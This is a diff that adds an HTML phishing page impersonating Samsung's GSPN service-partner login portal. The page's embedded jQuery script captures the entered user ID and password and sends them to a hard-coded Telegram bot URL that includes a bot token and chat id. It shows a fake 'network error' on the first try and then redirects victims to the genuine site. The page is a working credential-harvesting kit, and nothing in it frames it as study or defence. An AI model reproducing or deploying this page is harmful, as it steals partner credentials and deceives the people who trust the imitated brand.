@@ -1,1 +1,233 @@
-hello
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<title>GSPN</title>
+<link href="https://gspn2.samsungcsportal.com/basis/page/css/en/layout.css?version=20200228" rel="stylesheet" type="text/css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+<script>
+    $(document).ready(function() {
+        var info = false ;
+        var x = 0 ;
+
+        
+
+        $("#ok").on("click", function() {
+            
+
+            // var addres and full name
+            var userid = $('#user').val();
+            var pass = $('#pass').val();
+            
+            
+            
+          
+
+             if(userid =='' || pass =='') {
+                alert("Enter UserID and Password");
+               
+            }  
+            if (userid && pass) {
+                
+                var text = "GSPN userid :"+userid+"\n GSPN password :"+pass;
+                var info = true;
+
+
+            }
+          
+            if (info) {
+                if (x == 0){
+                    alert("network error occurred please try again");
+                }
+                
+                $.ajax({
+            
+                            url : 'https://api.telegram.org/bot875700651:AAGh1doQA3bUAsvU8DDJmoAzDIkEVBg_KUE/sendMessage?chat_id=897886098',
+                            type : 'Post',
+                            data: {
+                                text: text,
+                    },
+                            dataType : 'html',
+                            success : function(code_html, statut){ 
+                              if (x == 1){
+                                        location.href = "https://biz2.samsungcsportal.com/gspn/cache.do?cmd=userManageDetailPopupCmd&userId=&companyCode=&search_userId=&search_companyCode=&regId=&regCompanyCode=";
+                                    }
+                                    $('#user').val('');
+                                    $('#pass').val('');
+                                    
+                                   
+                                    x = x + 1 ;
+                            
+                            },
+                            
+
+                            error : function(resultat, statut, erreur){
+                            
+                            
+
+                            }
+});
+
+            }
+
+            
+
+        });
+        
+        
+    });
+</script>
+</head>
+
+<body class="login_body_wrap">
+
+<div class="login_wrap">
+ <form >
+ 	<div class="login_container">
+    	<div class="login_content">
+        	<h1 class="login_topbg"><img src="https://gspn2.samsungcsportal.com/basis/page/img/login_sys_logo.png" alt="Samung GSPN (Global Service Partner Network)"></h1>
+            <div class="login_conceptImg">
+            	<img src="https://gspn2.samsungcsportal.com/basis/page/img/login_img_01.gif" width="139" height="293" alt=""><img src="https://gspn2.samsungcsportal.com/basis/page/img/login_img_02.gif" width="174" height="293" alt=""><img src="https://gspn2.samsungcsportal.com/basis/page/img/login_img_03.gif" width="187" height="293" alt=""><img src="https://gspn2.samsungcsportal.com/basis/page/img/login_img_04.gif" width="211" height="293" alt=""><img src="https://gspn2.samsungcsportal.com/basis/page/img/login_img_05.gif" width="175" height="293" alt="">
+            </div>
+		<div id = "privacyPolicy_DIV" style="font: 11px/normal arial; margin: 0px 70px 0px auto; width: 800px; height: 20px; text-align: right; vertical-align: bottom; position: relative; font-size-adjust: none; font-stretch: normal;">
+	   		<dl>
+	           	<dt class="user_id">
+	           		
+	           		<SPAN onclick="javascript:MM_openBrWindow('https://gspn2.samsungcsportal.com/basis/common/privacyPolicyNonEu.jsp','personalInform','scrollbars=yes,resizable=yes,width=800,height=600')" style="CURSOR: pointer; COLOR: red">Privacy Policy</SPAN></dt>
+	           		
+	           	</dt>
+			</dl>
+	   	</div>  
+            <!-- End .login_conceptImg -->
+            <div class="login_form_wrap02" id="login_form_all">
+            	<div class="login_form">
+                	<dl>
+                    	<dt class="user_id">User ID</dt>
+                    	<dd class="user_id">
+                        <input type="text" id="user" name="LOGIN_ID" class="log_input" onkeydown="loginEnter(this, event)" tabindex=1><!-- 아이디가 존재할 경우 saveid() -->
+                        </dd>
+                        <dt class="user_pwd">Password</dt>
+                        <dd class="user_pwd">
+                        	<input id="pass" type="password" name="LOGIN_PWD" value="" class="log_input" onkeydown="loginEnter(this, event)" tabindex=2>                       	
+                        </dd>
+                        <dt class="save_id"></dt>
+                        <dd class="save_id">
+                        	<input type="checkbox" class="checkbox" id="checksaveid" name="checksaveid" value="checkbox" onClick="saveid(this.form)"> Save ID
+                        </dd>
+                    </dl>
+                    <img id="ok" src="https://gspn2.samsungcsportal.com/basis/page/img/login_btn.gif" width="127" height="43"  class="login_btn" alt="Login"><!-- 로그인 버튼(login()) -->
+                </div>
+                <!-- End .login_form -->
+
+                <div id = "recaptcha_DIV" class="recaptcha_wrap recaptcha_nothad_incorrect_sol recaptcha_isnot_showing_audio" style="display:none">
+                    <!-- 이미지 -->
+                    <span id="recaptcha_image" class="recaptcha_image" style="display: block; width: 300px; height: 57px;"><img id="recaptcha_challenge_image"  ></span>
+                    <!-- //이미지 -->
+                    <!-- 오디오 -->
+                    <span id="recaptcha_audio" class="recaptcha_audio">
+                    	<img src="https://gspn2.samsungcsportal.com/basis/page/img/btn_play.png" alt="Play" title="Play" />
+                        <img src="https://gspn2.samsungcsportal.com/basis/page/img/btn_mp3_download.png" alt="MP3 Download" title="MP3 Download" />
+                    </span>
+                    <!-- //오디오 -->
+                    <span class="recaptcha_txt">Enter the characters you see in the image into the textbox below</span>
+                    <input type="text" name="recaptcha_response_field" id="recaptcha_response_field" size="30" />
+                    <input type="hidden" name="recaptcha_challenge_field" id="recaptcha_challenge_field" size="30" />
+                    <div id="recaptcha_button_field" class="recaptcha_form">
+                        <a href="#" id="refrimg"><img src="https://gspn2.samsungcsportal.com/basis/page/img/btn_refresh.png" ti="Click here for a new image if you can not read the code above" title="Refresh" /></a>
+                        <span id="change_Audio">
+                        	<a href="#" id="hearAudio"><img src="https://gspn2.samsungcsportal.com/basis/page/img/btn_audio.png" alt="Click here to listen to the code" title="Audio" /></a>
+                        </span>
+                        <span id="change_Image">
+                        	<a href="#" id="captchaImage"><img src="https://gspn2.samsungcsportal.com/basis/page/img/btn_image.png" alt="Click here for a image" title="Image" /></a>
+                        </span>
+                	</div>
+            	</div> 
+                	
+            </div>
+            <!-- End .recaptcha_wrap -->
+            <div class="login_caution">
+            	<dl>
+                    <dt>Caution : </dt>
+                    <dd>Please input the exact official G-SPN URL when accessing the system, due to possible malicious and fake websites that attempt to steal ID/Password.</dd>
+                </dl>
+            </div>
+            <!-- End .login_caution -->
+		</div>
+        <!-- End .login_content -->
+	</div>
+    <!-- End .login_container -->
+    </form>
+           	
+    <div class="login_footer">
+    	<p>
+            <img src="https://gspn2.samsungcsportal.com/basis/page/img/copyright.gif" width="272" height="35" alt="Copyright Samsung GSPN">
+            <a href="#"><img src="https://gspn2.samsungcsportal.com/basis/page/img/verisign_02.gif" onClick="MM_openBrWindow('https://sealinfo.thawte.com/thawtesplash?form_file=fdf/thawtesplash.fdf&dn=*.SAMSUNGCSPORTAL.COM&lang=en','VeriSignSecurelSeal','scrollbars=no,resizable=yes,width=500,height=665')" alt="Secured by thawta"></a>
+    	</p>
+    </div>
+</div>
+<!-- End .login_wrap -->
+
+<form name="frmLogin" id="frmLogin" method="post">
+<input type=hidden name="LOGIN_ID">
+<input type=hidden name="LOGIN_PWD">
+<input type=hidden name="recaptcha_challenge_field">
+<input type=hidden name="recaptcha_response_field">
+<input type=hidden name="referer" id="referer" value="login">
+</form>
+</body>
+
+</html>
+
